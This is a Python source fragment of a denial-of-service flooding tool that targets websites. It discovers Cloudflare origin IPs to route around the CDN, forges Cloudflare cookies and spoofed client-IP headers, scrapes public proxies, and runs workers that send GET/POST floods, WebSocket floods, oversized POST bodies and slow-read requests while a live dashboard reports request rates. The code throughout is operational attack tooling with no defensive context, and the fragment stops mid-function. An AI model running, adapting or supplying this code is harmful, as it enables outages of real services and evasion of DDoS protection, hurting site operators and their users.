def print_live():
    global total_sent, total_failed, total_success, last_http_code, last_code_label, req_rate, stopped
    global bypass_active, latency_times, total_bytes_sent, total_bytes_recv, use_curl_cffi
    if stopped:
        return
    os.system("cls" if os.name == "nt" else "clear")
    safe_print(r"""
  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
 /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
 \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
""")
    last_str = f"{last_http_code} / {last_code_label}" if last_http_code else "— / —"
    bp_str = "Yes" if bypass_active else "No"
    bt_str = "Yes" if boost_mode else "No"
    mm_str = "Yes" if multi_method else "No"
    pb_str = "Yes" if post_bomb else "No"
    sr_str = "Yes" if slow_read else "No"
    as_str = "Yes" if adaptive_scaling else "No"
    h2_str = "Yes" if use_http2 else "Auto"
    ws_str = "Yes" if enable_websocket else "No"
    avg_lat = sum(latency_times) / len(latency_times) if latency_times else 0.0
    success_rate = (total_success / total_sent * 100) if total_sent else 0.0
    safe_print(f" Request sent      : {total_sent}")
    safe_print(f" Request failed    : {total_failed}")
    safe_print(f" Request success   : {total_success} ({success_rate:.1f}%)")
    safe_print(f" Bypass            : {bp_str}")
    safe_print(f" Boost             : {bt_str}")
    safe_print(f" Multi-method      : {mm_str}")
    safe_print(f" POST bomb         : {pb_str}")
    safe_print(f" Slow read         : {sr_str}")
    safe_print(f" Adaptive scaling  : {as_str}")
    safe_print(f" HTTP/2            : {h2_str}")
    safe_print(f" TLS impersonation : {'curl_cffi' if use_curl_cffi else 'aiohttp (native)'}")
    safe_print(f" WebSocket flood   : {ws_str}")
    safe_print(f" Sessions          : {session_count}")
    safe_print(f" Request rate      : {req_rate:.1f} req/s")
    safe_print(f" Peak RPS          : {peak_rps:.1f}")
    safe_print(f" Avg latency       : {avg_lat*1000:.1f} ms")
    safe_print(f" GET / POST / HEAD : {total_get_sent} / {total_post_sent} / {total_head_sent}")
    safe_print(f" 429 / 503         : {total_429} / {total_503}")
    safe_print(f" Conn errors       : {connection_errors}")
    safe_print(f" Bytes sent        : {total_bytes_sent / 1024 / 1024:.1f} MB")
    safe_print(f" Bytes recv        : {total_bytes_recv / 1024 / 1024:.1f} MB")
    if cf_kill:
        cf_str = "ACTIVE"
        do_str = f"Yes / {cf_origin_found} IPs" if direct_origin else "No"
        safe_print(f" CF Kill           : {cf_str}")
        safe_print(f" Direct origin     : {do_str}")
        safe_print(f" CF bypasses       : {cf_bypass_count}")
        safe_print(f" Subdomains found  : {cf_subdomains_found}")
    safe_print(f" Last request      : {last_str}")
    safe_print(f"\n Press Ctrl+C to stop.")

def _load_proxy_cache():
    if not os.path.isfile(PROXY_CACHE_FILE):
        return []
    try:
        with open(PROXY_CACHE_FILE, "r") as f:
            return [line.strip() for line in f if line.strip() and ":" in line]
    except Exception:
        return []

def _save_proxy_cache():
    global proxy_pool
    try:
        with proxy_lock:
            current = list(proxy_pool)
        with open(PROXY_CACHE_FILE, "w") as f:
            for p in current[:500]:
                f.write(p + "\n")
    except Exception:
        pass

async def _fetch_proxies_from_url(session, url):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            text = await resp.text()
            out = set()
            for line in text.split("\n"):
                line = line.strip()
                if not line or line.startswith(("#","/","!","<","[")):
                    continue
                if any(t in line.lower() for t in ["<html","doctype","alert(","script","<?xml"]):
                    continue
                clean = line.replace(" ","").replace("\t","")
                parts = clean.split(":")
                if len(parts) < 1:
                    continue
                ip = parts[0]
                octets = ip.split(".")
                if len(octets) != 4:
                    continue
                try:
                    o = [int(x) for x in octets]
                    if not all(0 <= x <= 255 for x in o):
                        continue
                    if o[0] == 0 or o[0] == 127 or o[0] >= 224:
                        continue
                    if o[0] == 10:
                        continue
                    if o[0] == 172 and 16 <= o[1] <= 31:
                        continue
                    if o[0] == 192 and o[1] == 168:
                        continue
                except ValueError:
                    continue
                port = "80"
                if len(parts) > 1:
                    p = parts[1]
                    if p.isdigit() and 1 <= int(p) <= 65535:
                        port = p
                out.add(f"{ip}:{port}")
            return list(out)
    except Exception:
        return []

async def _fetch_all_proxies():
    connector = aiohttp.TCPConnector(ssl=True, limit=20, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [_fetch_proxies_from_url(session, u) for u in PROXY_SOURCES]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_p = set()
        for r in results:
            if isinstance(r, list):
                all_p.update(r)
        return list(all_p)

def fetch_online_proxies():
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        proxies = loop.run_until_complete(_fetch_all_proxies())
        loop.close()
        return proxies
    except Exception:
        return []

async def _test_proxy(session, pstr, test_url):
    try:
        t0 = time.time()
        async with session.get(test_url, proxy=f"http://{pstr}",
                               timeout=aiohttp.ClientTimeout(total=VALIDATION_TIMEOUT)) as resp:
            await resp.read()
            lat = time.time() - t0
            if resp.status == 200:
                return (pstr, lat)
    except Exception:
        pass
    return None

async def _validate_batch(proxies, test_url, max_batch=800):
    connector = aiohttp.TCPConnector(ssl=False, limit=150, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(150)
        async def bounded(p):
            async with sem:
                return await _test_proxy(session, p, test_url)
        sample = proxies[:max_batch] if len(proxies) > max_batch else proxies
        tasks = [asyncio.create_task(bounded(p)) for p in sample]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        valid = []
        for r in results:
            if r and isinstance(r, tuple):
                pstr, lat = r
                if lat <= MAX_PROXY_LATENCY:
                    valid.append(pstr)
        return valid, len(sample)

def _run_proxy_validation(proxies, test_url):
    global proxy_validate_result, proxy_validate_done
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        old_stderr = sys.stderr
        sys.stderr = io.StringIO()
        try:
            result = loop.run_until_complete(_validate_batch(proxies, test_url))
        finally:
            sys.stderr = old_stderr
        loop.close()
        proxy_validate_result = result
    except Exception as e:
        proxy_validate_result = ([], 0)
    finally:
        proxy_validate_done.set()

def validate_proxies_background(proxies, test_url):
    global proxy_validate_done, proxy_validate_result
    proxy_validate_done.clear()
    proxy_validate_result = ([], 0)
    threading.Thread(target=_run_proxy_validation, args=(proxies, test_url), daemon=True).start()

def resolve_dns(host, doh=False):
    if doh or dns_over_https:
        try:
            providers = ["https://dns.google/resolve", "https://cloudflare-dns.com/dns-query",
                         "https://dns.quad9.net:5053/dns-query"]
            provider = random.choice(providers)
            params = {"name": host, "type": "A"}
            headers = {"Accept": "application/dns-json"}
            import urllib.request
            url = f"{provider}?{urlencode(params)}"
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                answers = data.get("Answer", [])
                ips = [a["data"] for a in answers if a.get("type") == 1]
                if ips:
                    return ips
        except Exception:
            pass
    ips = set()
    try:
        for _, _, _, _, addr in socket.getaddrinfo(host, 80, socket.AF_INET, socket.SOCK_STREAM):
            ips.add(addr[0])
    except Exception:
        pass
    return list(ips)

def resolve_dns_full(host):
    result = {"A":[],"AAAA":[],"CNAME":None}
    try:
        for family, _, _, canonname, addr in socket.getaddrinfo(host, 80):
            if canonname and canonname != host:
                result["CNAME"] = canonname
            if family == socket.AF_INET:
                result["A"].append(addr[0])
            elif hasattr(socket, "AF_INET6") and family == socket.AF_INET6:
                result["AAAA"].append(addr[0])
    except Exception:
        pass
    return result

def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False

def scan_ports_parallel(ip, ports):
    open_ports = []
    with ThreadPoolExecutor(max_workers=25) as ex:
        futures = {ex.submit(scan_port, ip, p): p for p in ports}
        for fut in as_completed(futures):
            if fut.result():
                open_ports.append(futures[fut])
    return sorted(open_ports)

def find_origin(host):
    origins = set()
    for sub in CF_SUBS:
        sd = f"{sub}.{host}"
        ips = resolve_dns(sd)
        if ips:
            origins.update(ips)
    return list(origins)

def enumerate_subdomains(host):
    found = {}
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {}
        for sub in SUBDOMAIN_COMMON:
            sd = f"{sub}.{host}"
            futures[ex.submit(resolve_dns, sd)] = sd
        for fut in as_completed(futures):
            ips = fut.result()
            if ips:
                found[futures[fut]] = ips
    return found

def get_ssl_cert_info(host, port=443):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                if not cert:
                    return None
                return {
                    "cn": dict(x[0] for x in cert.get("subject", [])).get("commonName","?"),
                    "org": dict(x[0] for x in cert.get("subject", [])).get("organizationName","?"),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])).get("commonName","?"),
                    "expires": cert.get("notAfter","?"),
                    "sans": [s[1] for s in cert.get("subjectAltName", []) if s[0] == "DNS"][:8],
                }
    except Exception:
        return None

CF_IP_RANGES = [
    ("103.21.244.0", 22), ("103.22.200.0", 22), ("103.31.4.0", 22),
    ("104.16.0.0", 13), ("108.162.192.0", 18), ("131.0.72.0", 22),
    ("141.101.64.0", 18), ("162.158.0.0", 15), ("172.64.0.0", 13),
    ("173.245.48.0", 20), ("188.114.96.0", 20), ("190.93.240.0", 20),
    ("197.234.240.0", 22), ("198.41.128.0", 17),
]

def _ip_to_int(ip):
    parts = ip.split(".")
    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])

def _cidr_to_range(base, prefix):
    base_int = _ip_to_int(base)
    mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    network = base_int & mask
    broadcast = network | (~mask & 0xFFFFFFFF)
    return network, broadcast

def is_cf_ip(ip):
    try:
        ip_int = _ip_to_int(ip)
        for base, prefix in CF_IP_RANGES:
            net_start, net_end = _cidr_to_range(base, prefix)
            if net_start <= ip_int <= net_end:
                return True
    except Exception:
        pass
    return False

def verify_origin_ip(ip, scheme, host):
    try:
        ssl_ctx = _browser_ssl_context() if scheme == "https" else False
        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def check():
            async with aiohttp.ClientSession(connector=connector) as s:
                headers = {"Host": host, "User-Agent": random.choice(UA_LIST)}
                target = f"{scheme}://{ip}/"
                async with s.get(target, headers=headers,
                                 timeout=aiohttp.ClientTimeout(total=8),
                                 allow_redirects=False) as resp:
                    await resp.read()
                    return resp.status
        try:
            code = loop.run_until_complete(asyncio.wait_for(check(), timeout=10))
            return 200 <= code < 400
        finally:
            loop.close()
    except Exception:
        return False

def discover_cf_origin(host):
    global origin_ips, cf_subdomains_found, cf_origin_found
    found = set()

    subs = enumerate_subdomains(host)
    for sd, ips in subs.items():
        for ip in ips:
            if not is_cf_ip(ip):
                found.add(ip)
    cf_subdomains_found = len(subs)

    for sub in CF_SUBS:
        sd = f"{sub}.{host}"
        ips = resolve_dns(sd)
        for ip in ips:
            if not is_cf_ip(ip):
                found.add(ip)

    origin_candidates = find_origin(host)
    for ip in origin_candidates:
        if not is_cf_ip(ip):
            found.add(ip)

    direct_dns = resolve_dns(host)
    for ip in direct_dns:
        if not is_cf_ip(ip):
            found.add(ip)

    cert = get_ssl_cert_info(host)
    if cert and cert.get("sans"):
        for san in cert["sans"]:
            if san != host and not san.startswith("*"):
                san_ips = resolve_dns(san)
                for ip in san_ips:
                    if not is_cf_ip(ip):
                        found.add(ip)

    origin_ips = list(found)
    cf_origin_found = len(origin_ips)
    return origin_ips

def gen_cf_cookies():
    cookies = {}
    for name in CF_COOKIE_NAMES:
        if random.random() > 0.3:
            val = base64.b64encode(random.randbytes(32)).decode()[:48]
            cookies[name] = val
    cookies["__cf_bm"] = base64.b64encode(random.randbytes(24)).decode()[:30]
    if random.random() > 0.5:
        cookies["cf_clearance"] = base64.b64encode(random.randbytes(40)).decode()[:60]
    return cookies

def cf_cookie_string():
    if cf_kill:
        c = gen_cf_cookies()
        return "; ".join(f"{k}={v}" for k, v in c.items())
    return None

def pick_cf_path():
    if post_bomb and random.random() < 0.55:
        return "/"
    r = random.random()
    if r < 0.25:
        return random.choice(CF_BYPASS_PATHS)
    elif r < 0.55:
        return random.choice(PRIMARY_PATHS)
    elif r < 0.80:
        return random.choice(SECONDARY_PATHS)
    return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))

async def cf_bypass_probe(target, host):
    global cf_bypass_count
    results = {"cf_detected": False, "challenge": False, "bypassed": False, "origin_ip": None}
    hdrs = build_headers(host)
    if use_curl_cffi:
        async with CurlAsyncSession(impersonate="chrome") as s:
            try:
                r = await s.get(target, headers=hdrs, timeout=8, allow_redirects=False)
                hs = str(dict(r.headers)).lower()
                if "cf-ray" in hs or "cloudflare" in hs or "__cfduid" in hs:
                    results["cf_detected"] = True
                if r.status_code == 403:
                    body = r.text
                    if "challenge" in body.lower() or "cf_chl" in body.lower():
                        results["challenge"] = True
                if r.status_code < 400:
                    results["bypassed"] = True
            except Exception:
                pass
            for path in ["/cdn-cgi/trace", "/robots.txt", "/.well-known/security.txt"]:
                try:
                    r = await s.get(f"{target}{path}", headers=hdrs, timeout=5, allow_redirects=False)
                    if r.status_code < 400:
                        results["bypassed"] = True
                        with lock:
                            cf_bypass_count += 1
                except Exception:
                    pass
    else:
        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=5, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as s:
            try:
                async with s.get(target, headers=hdrs,
                                 timeout=aiohttp.ClientTimeout(total=8),
                                 allow_redirects=False) as resp:
                    raw_headers = dict(resp.headers)
                    hs = str(raw_headers).lower()
                    if "cf-ray" in hs or "cloudflare" in hs or "__cfduid" in hs:
                        results["cf_detected"] = True
                    if resp.status == 403:
                        body = await resp.text()
                        if "challenge" in body.lower() or "cf_chl" in body.lower():
                            results["challenge"] = True
                    if resp.status < 400:
                        results["bypassed"] = True
            except Exception:
                pass
            for path in ["/cdn-cgi/trace", "/robots.txt", "/.well-known/security.txt"]:
                try:
                    async with s.get(f"{target}{path}", headers=hdrs,
                                     timeout=aiohttp.ClientTimeout(total=5),
                                     allow_redirects=False) as resp:
                        if resp.status < 400:
                            results["bypassed"] = True
                            with lock:
                                cf_bypass_count += 1
                except Exception:
                    pass
    return results

def detect_technologies(headers):
    detected = set()
    hs = str(headers).lower()
    for tech, sigs in TECH_SIGNATURES.items():
        for sig in sigs:
            if sig in hs:
                detected.add(tech)
                break
    srv = headers.get("Server", headers.get("server", ""))
    if srv:
        detected.add(f"Server={srv}")
    xpb = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
    if xpb:
        detected.add(f"Powered={xpb}")
    return sorted(detected)

def discover_known_paths(target, host):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def check_curl(session, p):
        try:
            hdrs = build_headers(host)
            r = await session.get(f"{target}{p}", headers=hdrs, timeout=5, allow_redirects=True)
            if r.status_code < 400:
                return p
        except Exception:
            pass
        return None
    async def check_aiohttp(session, p):
        try:
            hdrs = build_headers(host)
            async with session.get(f"{target}{p}", headers=hdrs,
                                   timeout=aiohttp.ClientTimeout(total=5),
                                   allow_redirects=True) as r:
                await r.read()
                if r.status < 400:
                    return p
        except Exception:
            pass
        return None
    async def run():
        if use_curl_cffi:
            async with CurlAsyncSession(impersonate="chrome") as s:
                tasks = [check_curl(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                return [r for r in results if isinstance(r, str)]
        else:
            ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
            connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=15, force_close=True)
            async with aiohttp.ClientSession(connector=connector) as s:
                tasks = [check_aiohttp(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                return [r for r in results if isinstance(r, str)]
    good = loop.run_until_complete(run())
    loop.close()
    return good

def build_headers(host, profile=None, method="GET", port=None):
    ip1 = gen_ip()
    ip2 = gen_ip()
    ip3 = gen_ip()
    rid = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    rv = str(random.randint(10000, 99999))
    ua = profile["ua"] if profile else random.choice(UA_LIST)
    lang = profile.get("lang","en-US,en;q=0.9") if profile else random.choice([
        "en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9",
        "de-DE,de;q=0.9","fr-FR,fr;q=0.9","es-ES,fr;q=0.9"])

    # Host header must include non-standard port
    if port and port not in (80, 443):
        host_header = f"{host}:{port}"
    else:
        host_header = host

    h = {
        "Host": host_header,
        "User-Agent": ua,
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "*/*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.8",
        ]),
        "Accept-Language": lang,
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
        "Cache-Control": random.choice(["no-cache","max-age=0"]),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(128,142)}", "Google Chrome";v="{random.randint(128,142)}", "Not=A?Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"','"macOS"','"Linux"']),
    }

    if boost_mode:
        h["Range"] = gen_range_header()
        h["If-None-Match"] = f'"{ "".join(random.choices("abcdef0123456789", k=16)) }"'
        h["If-Modified-Since"] = f"{random.randint(2020,2025)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}T{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}Z"
        h["X-Forwarded-For"] = f"{gen_ip()}, {gen_ip()}, {gen_ip()}, {ip1}"
        h["X-Real-IP"] = ip3
        h["X-Forwarded-Host"] = host_header
        h["X-Original-URL"] = random.choice(PRIMARY_PATHS+SECONDARY_PATHS)
        h["X-Rewrite-URL"] = random.choice(PRIMARY_PATHS+SECONDARY_PATHS)
        h["X-Custom-IP-Authorization"] = ip3
        h["CF-Connecting-IP"] = ip3
        h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR","SE","NO","FI","DK","IT","ES","MX","IN","KR","TW"])
        h["Forwarded"] = f"for={ip3};proto=https;by={gen_ip()};host={host_header}"
        h["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish','haproxy','envoy','traefik','caddy','apache','lighttpd'])}"
        if random.random() > 0.5:
            h["X-HTTP-Method-Override"] = random.choice(["GET","POST","HEAD"])
        if random.random() > 0.5:
            h["X-Forwarded-Port"] = str(random.choice([80,443,8080,8443]))
        if random.random() > 0.3:
            h["X-Access-Token"] = base64.b64encode(random.randbytes(24)).decode()
        if random.random() > 0.3:
            h["X-Api-Key"] = "".join(random.choices("abcdef0123456789", k=32))

    if bypass_active and not boost_mode:
        h["X-Client-IP"] = gen_ip()
        h["X-Forwarded-Host"] = host_header
        h["X-HTTP-Method-Override"] = "GET"
        h["X-Forwarded-Proto"] = "https"
        h["X-Forwarded-Scheme"] = "https"
        h["CF-Connecting-IP"] = gen_ip()
        h["X-Remote-IP"] = gen_ip()
        h["Client-IP"] = gen_ip()
        h["X-Cluster-Client-IP"] = gen_ip()
        h["Forwarded"] = f"for={gen_ip()};proto=https;by={gen_ip()};host={host_header}"
        h["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish','haproxy','envoy','traefik','caddy'])}"
        h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR"])
        h["True-Client-IP"] = gen_ip()
        h["X-Originating-IP"] = gen_ip()
        if random.random() > 0.5:
            h["X-Forwarded-For"] = f"{gen_ip()}, {gen_ip()}, {gen_ip()}, {ip1}"

    if method in ("POST", "PUT", "PATCH"):
        h["Content-Type"] = random.choice(POST_CONTENT_TYPES)
        # Content-Length is set automatically by aiohttp based on actual data

    if random.random() > 0.4:
        h["Referer"] = f"https://www.google.com/search?q={rv}"
    if random.random() > 0.3:
        h["Origin"] = f"https://{host_header}"
    if random.random() > 0.5:
        c = base64.b64encode(random.randbytes(12)).decode()[:16]
        h["Cookie"] = f"_ga=GA1.2.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}; sid={c}"
    if random.random() > 0.3:
        h["Cookie"] = h.get("Cookie","") + f"; _fbp=fb.1.{int(time.time()*1000)}.{random.randint(1000000000,9999999999)}; _gcl_au=1.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}"

    if cf_kill:
        h["CF-Connecting-IP"] = ip3
        h["True-Client-IP"] = ip3
        h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR","SE","NO","FI","DK","IT","ES","MX","IN","KR","TW","SG","AE"])
        h["CF-RAY"] = f"{''.join(random.choices('abcdef0123456789', k=16))}-{random.choice(['LHR','LAX','FRA','SIN','AMS','IAD','SJC','DFW','SEA','ORD','JFK','CDG','NRT','HKG','SYD','ARN','WAW','MAD','MXP','VIE','DUB','LIS','CPH','OSL','HEL'])}"
        h["CF-Visitor"] = json.dumps({"scheme":"https"})
        h["X-Forwarded-For"] = f"{ip3}, {gen_ip()}, {ip1}"
        h["X-Real-IP"] = ip3
        h["X-Forwarded-Host"] = host_header
        h["X-Original-URL"] = random.choice(PRIMARY_PATHS + SECONDARY_PATHS)
        h["X-Rewrite-URL"] = random.choice(PRIMARY_PATHS + SECONDARY_PATHS)
        h["X-Custom-IP-Authorization"] = ip3
        h["Forwarded"] = f"for={ip3};proto=https;by={gen_ip()};host={host_header}"
        if random.random() > 0.5:
            h["X-HTTP-Method-Override"] = random.choice(["GET","POST","HEAD"])

        cf_cookie = cf_cookie_string()
        if cf_cookie:
            existing = h.get("Cookie", "")
            h["Cookie"] = f"{existing}; {cf_cookie}" if existing else cf_cookie

    return h

def worker_profile():
    return {
        "ua": random.choice(UA_LIST),
        "lang": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9","de-DE,de;q=0.9","fr-FR,fr;q=0.9"]),
        "id": "".join(random.choices("abcdef0123456789", k=8)),
        "delay_min": random.uniform(0.0003, 0.002),
        "delay_max": random.uniform(0.003, 0.015),
    }

async def attack_worker(session, url_obj, host, tid):
    global total_sent, total_failed, total_success, last_http_code, last_code_label, rate_times
    global total_proxy_used, total_direct_used, proxy_alive
    global total_post_sent, total_get_sent, total_head_sent, total_429, total_503, adaptive_cooldown
    global cf_bypass_count, cf_origin_target, connection_errors
    global latency_times, total_bytes_sent, total_bytes_recv, use_curl_cffi

    scheme = url_obj.scheme
    netloc = url_obj.netloc
    profile = worker_profile()

    await asyncio.sleep(random.uniform(0, 0.5))

    while running:
        method = pick_method()
        if cf_kill:
            path = pick_cf_path()
        else:
            path = pick_path()
        if boost_mode or multi_method or cf_kill:
            path = cache_bust(path)
        headers = build_headers(host, profile, method, port=url_obj.port)

        if cf_kill and direct_origin and origin_ips:
            origin_ip = random.choice(origin_ips)
            target = f"{scheme}://{origin_ip}{path}"
            headers["Host"] = host
        else:
            target = f"{scheme}://{netloc}{path}"

        # WebSocket flood attack vector (aiohttp only — curl_cffi has no WS support)
        if enable_websocket and not use_curl_cffi and random.random() < 0.25:
            try:
                ws_path = random.choice(WEBSOCKET_PATHS)
                if cf_kill and direct_origin and origin_ips:
                    ws_target = f"{scheme.replace('http', 'ws')}://{origin_ip}{ws_path}"
                else:
                    ws_target = f"{scheme.replace('http', 'ws')}://{netloc}{ws_path}"
                async with session.ws_connect(ws_target, headers=headers,
                                              timeout=aiohttp.ClientTimeout(total=2),
                                              protocols=["chat", "binary", "super"],
                                              autoping=False) as ws:
                    for _ in range(random.randint(3, 10)):
                        if random.random() > 0.5:
                            await ws.send_str(gen_payload(random.randint(50, 400)))
                        else:
                            await ws.send_bytes(random.randbytes(random.randint(64, 512)))
                        await asyncio.sleep(0.001)
                with lock:
                    total_sent += 1
                    total_success += 1
                    if method == "GET":
                        total_get_sent += 1
                    elif method == "POST":
                        total_post_sent += 1
                    elif method == "HEAD":
                        total_head_sent += 1
                rate_times.append(time.time())
                if adaptive_cooldown:
                    await asyncio.sleep(random.uniform(0.001, 0.005))
                    adaptive_cooldown = False
                elif boost_mode:
                    await asyncio.sleep(random.uniform(0.0001, 0.002))
                continue
            except Exception:
                pass

        post_data = None
        if method in ("POST", "PUT", "PATCH") and (post_bomb or multi_method):
            post_data = gen_payload()

        try:
            start_ts = time.time()

            if use_curl_cffi:
                req_kwargs = {"headers": headers, "timeout": 8, "allow_redirects": True}
                if method in ("POST", "PUT", "PATCH") and post_data:
                    req_kwargs["data"] = post_data
                req_func = getattr(session, method.lower())
                resp = await req_func(target, **req_kwargs)
                code = resp.status_code
                body = resp.content
            else:
                if method == "GET":
                    ctx = session.get(target, headers=headers,
                                      timeout=aiohttp.ClientTimeout(total=3),
                                      allow_redirects=True)
                elif method == "POST":
                    ctx = session.post(target, headers=headers, data=post_data,
                                       timeout=aiohttp.ClientTimeout(total=3),
                                       allow_redirects=True)
                elif method == "HEAD":
                    ctx = session.head(target, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=3),
                                       allow_redirects=True)
                elif method == "OPTIONS":
                    ctx = session.options(target, headers=headers,
                                          timeout=aiohttp.ClientTimeout(total=3),
                                          allow_redirects=True)
                elif method == "PUT":
                    ctx = session.put(target, headers=headers, data=post_data,
                                      timeout=aiohttp.ClientTimeout(total=3),
                                      allow_redirects=True)
                elif method == "PATCH":
                    ctx = session.patch(target, headers=headers, data=post_data,
                                        timeout=aiohttp.ClientTimeout(total=3),
                                        allow_redirects=True)
                elif method == "DELETE":
                    ctx = session.delete(target, headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=3),
                                         allow_redirects=True)
                else:
                    ctx = session.get(target, headers=headers,
                                      timeout=aiohttp.ClientTimeout(total=3),
                                      allow_redirects=True)

                async with ctx as resp:
                    code = resp.status
                    body = b""
                    if slow_read and not boost_mode and resp.content_length and resp.content_length > 0:
                        try:
                            while True:
                                chunk = await asyncio.wait_for(
                                    resp.content.read(64), timeout=10)
                                if not chunk:
                                    break
                                await asyncio.sleep(random.uniform(0.5, 2.0))
                        except Exception:
                            pass
                    else:
                        body = await resp.read()

            latency = time.time() - start_ts
            with lock:
                latency_times.append(latency)
                total_bytes_recv += len(body)
                if post_data:
                    total_bytes_sent += len(post_data.encode() if isinstance(post_data, str) else post_data)
                total_sent += 1
                last_http_code = code
                last_code_label = code_label(code)
                total_direct_used += 1
                if 200 <= code < 400:
                    total_success += 1
                    if cf_kill:
                        cf_bypass_count += 1
                else:
                    total_failed += 1
                    if total_failed <= 20:
                        body_snip = body[:120].decode("utf-8", "ignore").replace("\n", " ")
                        log_error(f"HTTP {code} | target={target} | body={body_snip}")
                if method == "GET":
                    total_get_sent += 1
                elif method == "POST":
                    total_post_sent += 1
                elif method == "HEAD":
                    total_head_sent += 1
                if code == 429:
                    total_429 += 1
                elif code == 503:
                    total_503 += 1

                if adaptive_scaling and code in (429, 503):
                    adaptive_cooldown = True

        except Exception as e:
            err_msg = f"{type(e).__name__}: {str(e)[:120]} | target={target}"
            log_error(err_msg)
            with lock:
                total_sent += 1
                total_failed += 1
                connection_errors += 1
                if method == "GET":
                    total_get_sent += 1
                elif method == "POST":
                    total_post_sent += 1
                elif method == "HEAD":
                    total_head_sent += 1
                if total_failed <= 10:
                    last_code_label = f"ERR: {type(e).__name__[:20]}"
        except Exception as e:
            err_msg = f"UNEXPECTED {type(e).__name__}: {str(e)[:120]} | target={target}"
            log_error(err_msg)
            with lock:
                total_sent += 1
                total_failed += 1
                connection_errors += 1
                if method == "GET":
                    total_get_sent += 1
                elif method == "POST":
                    total_post_sent += 1
                elif method == "HEAD":
                    total_head_sent += 1
                if total_failed <= 10:
                    last_code_label = f"ERR: {type(e).__name__[:20]}"

        rate_times.append(time.time())

        if adaptive_cooldown:
            await asyncio.sleep(random.uniform(0.001, 0.005))
            adaptive_cooldown = False
        elif boost_mode:
            await asyncio.sleep(random.uniform(0.0001, 0.002))
        elif bypass_active:
